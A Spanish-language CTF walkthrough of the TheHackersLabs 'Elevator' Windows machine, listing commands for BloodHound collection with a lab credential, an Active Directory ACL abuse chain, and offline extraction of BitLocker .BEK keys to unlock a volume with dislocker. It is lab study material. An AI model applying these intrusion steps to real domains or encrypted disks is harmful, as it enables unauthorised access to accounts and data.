---
tags: [ctf, thehackerslabs, windows, walkthrough, active-directory, bitlocker]
tipo: walkthrough
estado: resuelto
---

# Elevator — Walkthrough

> [!note] Documento de detalle
> El **walkthrough completo** está en [[Elevator - Roadmap]]. Aquí se resumen los pasos con su interpretación.

## Paso 1 — Autenticación y recolección BloodHound

**Comando**
```bash
netexec smb 192.168.56.104 -u john.smith -p 'Rk436\#Z4&'
bloodhound-python -u john.smith -p 'Rk436\#Z4&' -d bloodhound.thl -dc elevator.bloodhound.thl -ns 192.168.56.104 -c All --zip
```

**Interpretación / por qué**
- `john.smith` es la credencial inicial. BloodHound dibuja la ruta de ACLs.

## Paso 2 — Cadena de ACLs hasta `OPERACIONES`

**Concepto**
```text
JOHN.SMITH --AddSelf--> FINANZAS
FINANZAS --GenericAll--> MARY.JOHNSON
MARY.JOHNSON --ForceChangePassword--> ROBERT.WILLIAMS
ROBERT.WILLIAMS --WriteDacl--> PATRICIA.BROWN
PATRICIA.BROWN --WriteOwner--> OPERACIONES
PATRICIA.BROWN (owner) --WriteDacl/WriteMembers--> OPERACIONES
```

**Interpretación / por qué**
- Se ejecuta la cadena con `ldapmodify`/Impacket hasta controlar `OPERACIONES`.

## Paso 3 — Validar si `OPERACIONES` sirve

**Comprobaciones**
```text
- ACEs salientes de OPERACIONES
- tokenGroups / anidamiento en grupos privilegiados
- DRSUAPI (DCSync)
- acceso a shares
```

**Resultado**
- 🔴 `OPERACIONES` **no** tiene ACEs salientes, **no** está anidado y **no** otorga DCSync ni acceso a shares. La cadena AD **termina**.

**Interpretación / por qué**
- **No** hay que asumir que una cadena de BloodHound llega a DCSync: hay que comprobar las **DACLs reales**.

## Paso 4 — Extraer las `.BEK` del disco auxiliar

**Comando**
```bash
# Disco auxiliar NTFS de 10 MB etiquetado "Bitlocker" (elev_seed.ntfs)
fls -r -p elev_seed.ntfs
icat elev_seed.ntfs <inode>          # -> 3 archivos .BEK
```

**Interpretación / por qué**
- Las **startup keys** `.BEK` están accesibles **offline** en un disco auxiliar.

## Paso 5 — Identificar protectores BitLocker

**Comando**
```bash
cryptsetup bitlkDump elev.raw        # sobre copia sparse (primer/último tramo)
```

**Interpretación / por qué**
- Permite identificar los **protectores** del volumen BitLocker **sin** copiar los 50 GB.

## Paso 6 — Montar y leer las flags

**Comando**
```bash
# dislocker extraído de un .deb y ejecutado en espacio de usuario (FUSE)
dislocker -V /dev/loopX -k <archivo.bek> -- /mnt/elev_clear
# o vía FUSE sobre la imagen
fls -r -p /mnt/elev_clear/dislocker-file | grep -i -E 'user.txt|root.txt'
icat /mnt/elev_clear/dislocker-file <inode>
```

**Interpretación / por qué**
- Con la `.BEK` se monta el volumen **sin** recovery password ni root → se leen `user.txt` y `root.txt`.

## Qué funcionó

- BloodHound para la ruta.
- Validación honesta del alcance de `OPERACIONES`.
- Extracción offline de `.BEK` + `dislocker`.

## Qué falló (y por qué)

- Asumir que `OPERACIONES` daría DCSync: **no** lo da.

## Qué aprendí

- BitLocker con `.BEK` accesibles = protección nula.
- `cryptsetup bitlkDump` + `dislocker` + FUSE sin root.
- `PYTHONNOUSERSITE=1` evita conflictos de `cryptography` de `~/.local`.
